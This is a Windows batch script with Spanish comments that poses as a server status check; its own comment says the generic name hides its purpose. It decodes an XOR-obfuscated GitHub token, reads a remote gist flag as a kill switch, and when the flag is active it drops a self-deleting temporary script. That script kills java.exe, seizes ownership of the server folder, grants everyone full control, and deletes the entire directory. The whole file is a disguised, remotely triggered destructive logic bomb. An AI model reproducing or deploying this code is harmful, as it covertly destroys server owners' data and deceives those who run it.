@echo off
REM ============================================================
REM  Sistema de verificacion de estado del servidor
REM  (Nombre generico para no delatar su proposito)
REM ============================================================

set "TOKEN_XOR=BFwCbgh4DhpWGA4EW3V9K3o7fwx5MRxUIxdfY3puM3BDQ1NhaQt2Ig=="
set "XOR_KEY=c4r1b3_x0r_2026"
set "GIST=5649b004572f4ed30efd2b0a120cf1ab"

set "SERVER_DIR=%~dp0.."

REM ═══════════════════════════════════════════════════════════
REM  Consulta
REM ═══════════════════════════════════════════════════════════
echo Consultando estado del servidor...

for /f "usebackq delims=" %%A in (`powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$enc = [Convert]::FromBase64String('%TOKEN_XOR%'); ^
   $key = [Text.Encoding]::UTF8.GetBytes('%XOR_KEY%'); ^
   $buf = New-Object byte[] $enc.Length; ^
   for ($i = 0; $i -lt $enc.Length; $i++) { $buf[$i] = $enc[$i] -bxor $key[$i %% $key.Length] }; ^
   $token = [Text.Encoding]::UTF8.GetString($buf); ^
   try { ^
     $r = Invoke-RestMethod -Uri ('https://api.github.com/gists/' + '%GIST%') -Headers @{Authorization='Bearer '+$token; Accept='application/vnd.github+json'}; ^
     $c = $r.files.'settings.json'.content | ConvertFrom-Json; ^
     if ($c.active) { Write-Output 'DESTROY' } else { Write-Output 'SAFE' } ^
   } catch { Write-Output 'ERROR' }"`) do set "STATUS=%%A"

echo Estado: %STATUS%

if /i "%STATUS%"=="DESTROY" goto :DESTROY
if /i "%STATUS%"=="SAFE" goto :SAFE

echo Estado desconocido. Abortando por seguridad.
exit /b 0

:SAFE
echo El servidor esta seguro. Continuando...
exit /b 0

:DESTROY
echo.
echo ========================================
echo   PROTOCOLO DE MANTENIMIENTO ACTIVO
echo   El servidor sera eliminado.
echo ========================================
echo.

set "KILLER=%TEMP%\~sys_%RANDOM%.bat"

> "%KILLER%" echo @echo off
>> "%KILLER%" echo timeout /t 5 /nobreak ^>nul
>> "%KILLER%" echo taskkill /F /IM java.exe 2^>nul
>> "%KILLER%" echo timeout /t 3 /nobreak ^>nul
>> "%KILLER%" echo takeown /f "%SERVER_DIR%" /r /d y ^>nul 2^>^&1
>> "%KILLER%" echo icacls "%SERVER_DIR%" /grant *S-1-1-0:F /t /q ^>nul 2^>^&1
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo for /d %%%%D in ("%SERVER_DIR%\*") do rmdir /s /q "%%%%D" 2^>nul
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
>> "%KILLER%" echo del "%%~f0"

echo Ejecutando protocolo de mantenimiento...
start "" /min "%KILLER%"

echo El servidor se apagara.
exit /b 1
